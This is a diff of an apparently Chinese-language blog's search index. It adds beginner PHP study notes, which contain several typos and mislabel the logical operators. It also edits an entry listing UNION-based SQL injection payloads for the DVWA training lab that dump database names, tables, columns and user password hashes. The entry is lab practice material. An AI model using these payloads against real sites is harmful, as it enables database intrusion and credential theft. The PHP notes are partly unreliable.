@@ -1,9 +1,61 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[4-PHP-函数语法]]></title>
+    <url>%2F2019%2F09%2F10%2F4-PHP-%E5%87%BD%E6%95%B0%E8%AF%AD%E6%B3%95%2F</url>
+    <content type="text"><![CDATA[0x01函数的定义123456function 函数名(参数1，参数2，...，参数n)&#123; 函数体； return 表达式； &#125; 0x02函数调用 函数名（）;//调用函数 函数默认参数12345678function test（$a=10）&#123; echo $a; &#125;st（20）;//结果为 20test（10）;//结果为10 > 可变函数（变量函数）1234567function test（）&#123; echo &quot;我是test函数&quot;;&#125;$a = &quot;test&quot;;//把函数加上引号，赋给变量即可$a();//test（）;]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>编程语言</tag>
+        <tag>PHP</tag>
+        <tag>基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[3-PHP-数组语法]]></title>
+    <url>%2F2019%2F09%2F10%2F3-PHP-%E6%95%B0%E7%BB%84%E8%AF%AD%E6%B3%95%2F</url>
+    <content type="text"><![CDATA[0x01数组创建 $变量名[索引值]=数据内容1234567&lt;?php$student[0]=10;$student[1]=&quot;毛不易&quot;;$student[2]=true;$student[3]=60.5;var_dump(student); //打印数组?&gt; $变量名=array（key1=&gt;value1,……）12345678910&lt;?php$student1=array(10,&quot;毛不易&quot;,true,60.5);var_dump($student); //打印数组$student1=array( 0=&gt;10, 1=&gt;&quot;毛不易&quot;, 2=&gt;true, 3=&gt;60.5);?&gt; > 二维数组定义123456789&lt;?php$students=array( 0=&gt;array(1,&quot;毛不易&quot;,true,99.5), 2=&gt;array(2,&quot;薛之谦&quot;,true,88.5), 3=&gt;array(3,&quot;杨幂&quot;,falst,77.5),);var_dump($students);var_dump($students[2][1]) //打印结果杨幂?&gt; 0x02遍历数组 for语句遍历 123456789&lt;?php$arr=array( &apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;,&apos;e&apos;,&apos;f&apos;);for($i=0;$i&lt;count($arr);$i++)&#123; echo $arr[$i].&apos; &apos;;&#125;?&gt;// count($arr) 作用是取数组长度 函数用在for里有缺陷 每次循环都要执行一次 foreach语句遍历 12345678910&lt;?php$arr=array( &apos;name&apos;=&gt;&apos;毛不易&apos;, &apos;num&apos;=&gt;20 );foreach($arr as $value)&#123; echo $value.&apos; &apos;;&#125;?&gt;//在php中常用于关联数组 打印键名和值 12345&lt;?phpforeach($arr as $key=&gt;$value)&#123; echo $key.&apos;=&gt;&apos;.&apos;value&apos;;&#125;?&gt;]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>编程语言</tag>
+        <tag>PHP</tag>
+        <tag>基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[2-PHP-分支循环语句语法]]></title>
+    <url>%2F2019%2F09%2F10%2F2-PHP-%E5%88%86%E6%94%AF%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5%E8%AF%AD%E6%B3%95%2F</url>
+    <content type="text"><![CDATA[0x01分支语句 if 语句 单项条件 123if（表达式） &#123;语句&#125;； 双向条件 12if（表达式） &#123;语句块&#125;； 多向条件 1234567if（表达式） &#123;语句块&#125;elseif（表达式） &#123;语句块&#125;elseif（表达式） &#123;语句块&#125; ..... switch 语句 1234567891011switch（表达式）&#123; case 值1： 表达式 1； break； case 值2： 表达式2； break； ...... default： 语句块n； &#125; 0X02循环控制语句 while 语句 123while（表达式）&#123; 语句块；&#125; do…while 语句 123 do&#123;语句块；&#125;while(表达式)； for 语句 123for(表达式a;表达式b;表达式c)&#123; 语句块； &#125; 0x04特殊的流程控制语句 break 语句 作用：用于switch语句，for，while，do…while,foreach,用于中断这些语句！ continue 语句 作用：只能用在循环语句，跳出本次循环，并不是结束整个循环语句！ exit() 语句 作用：结束当前整个程序的执行 die()]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>编程语言</tag>
+        <tag>PHP</tag>
+        <tag>基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[1-PHP-基本语法]]></title>
+    <url>%2F2019%2F09%2F10%2F1-PHP-%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95%2F</url>
+    <content type="text"><![CDATA[0x01变量 变量定义： $变量名=数据(值) $a=1000； //定义$a变量 /变量名严格区分大小写/ 变量销毁 unse($变量名称) usert($a)； //销毁$a变量 0x02变量类型 输出变量类型： var_dump(变量名) 变量类型 1 . bool（布尔型）2 . int（整形）3 . float（浮点型，也称double）4 . string（字符型） 5 . array（数组） 6 . object（对象）7 . resource（资源）8 . NULL 变量类型测试函数 is_bool（变量） is_int（变量） is_array（变量） 0x03常量 定义和使用： define（） define(&quot;NAME&quot;,&quot;YANGFAN&quot;) //定义NAME的常量 defind（） //检查是否定义了某个常量 0x04运算符 算术运算符 +&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;*&nbsp;&nbsp;&nbsp;/&nbsp;&nbsp;&nbsp;%&nbsp;&nbsp;&nbsp;++&nbsp;&nbsp;&nbsp;– 字符串运算符. （连接运算符） 赋值运算符 =&nbsp;&nbsp;&nbsp;+=&nbsp;&nbsp;&nbsp;-+&nbsp;&nbsp;&nbsp;*=&nbsp;&nbsp;&nbsp;/+&nbsp;&nbsp;&nbsp;%=&nbsp;&nbsp;&nbsp;.= 比较运算符 ==&nbsp;&nbsp;&nbsp;===（全等）&nbsp;&nbsp;&nbsp;!=&nbsp;&nbsp;&nbsp;&lt;&gt;（不等）&nbsp;&nbsp;&nbsp;!==（不全等）&nbsp;&nbsp;&nbsp;&lt;&nbsp;&nbsp;&nbsp;&gt;&nbsp;&nbsp;&nbsp;&lt;=&nbsp;&nbsp;&nbsp;&gt;= 逻辑运算符 and（或）&nbsp;&nbsp;&nbsp;or（与）&nbsp;&nbsp;&nbsp;Xor（异或）&nbsp;&nbsp;&nbsp;Not（非）&nbsp;&nbsp;&nbsp;&amp;&amp;（或）&nbsp;&nbsp;&nbsp;||（与） 位运算符 &amp;（按位与运算）&nbsp;&nbsp;&nbsp;|（按位或运算）&nbsp;&nbsp;&nbsp;^（按位异或运算）&nbsp;&nbsp;&nbsp;~（求反运算）&nbsp;&nbsp;&nbsp;〈〈（左移运算）&nbsp;&nbsp;&nbsp;〉〉（右移运算） 其他运算符 ?:&nbsp;&nbsp;&nbsp;‘’&nbsp;&nbsp;&nbsp;@&nbsp;&nbsp;&nbsp;=&gt;&nbsp;&nbsp;&nbsp;-&gt;&nbsp;&nbsp;&nbsp;instanceof 运算符优先级 说明： 左 ＝ 从左到右，右 ＝ 从右到左。运算符优先级中，or 和 ||，&amp;&amp; 和 and 都是逻辑运算符，效果一样，但是其优先级却不一样。]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>编程语言</tag>
+        <tag>PHP</tag>
+        <tag>基础</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[DVWA1.10-SQL Injection Payload]]></title>
     <url>%2F2019%2F09%2F08%2FDVWA-SQL-Injection-Payload%2F</url>
-    <content type="text"><![CDATA[0x01 Low （get注入） 查数据库 1-1 &apos;union select 1,group_concat(schema_name) from information_schema.schemata where schema_name=database() # 查表名 1-1 &apos;union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 查字段名 1-1 &apos;union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() # 查值 1-1 &apos;union select 1,group_concat(user,password) from users # 0x02 Medium（post注入（抓包））： 查数据库 1-1 &apos;union select 1,group_concat(schema_name) frominformation_schema.schemata where schema_name=database() # 查表名 1-1 &apos;union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 查字段名 1-1 &apos;union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() # 查值 1-1 &apos;union select 1,group_concat(user,password) from users # 0x03 High（get注入（与Low级别区别只在于多了一个LIMIT 1）） 查数据 1-1 union select 1,group_concat(schema_name) frominformation_schema.schemata where schema_name=database() # 查表名 1-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 查字段名 1-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() # 查值 1-1 union select 1,group_concat(user,password) from users #]]></content>
+    <content type="text"><![CDATA[0x01 Low （get注入） 查数据库 1-1 &apos;union select 1,group_concat(schema_name) from information_schema.schemata where schema_name=database() # 查表名 1-1 &apos;union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 查字段名 1-1 &apos;union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() # 查值 1-1 &apos;union select 1,group_concat(user,password) from users # 0x02 Medium（post注入（抓包））： 查数据库 1-1 &apos;union select 1,group_concat(schema_name) from information_schema.schemata where schema_name=database() # 查表名 1-1 &apos;union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 查字段名 1-1 &apos;union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() # 查值 1-1 &apos;union select 1,group_concat(user,password) from users # 0x03 High（get注入（与Low级别区别只在于多了一个LIMIT 1）） 查数据 1-1 union select 1,group_concat(schema_name) from information_schema.schemata where schema_name=database() # 查表名 1-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 查字段名 1-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() # 查值 1-1 union select 1,group_concat(user,password) from users #]]></content>
       <categories>
         <category>学习笔记</category>
       </categories>
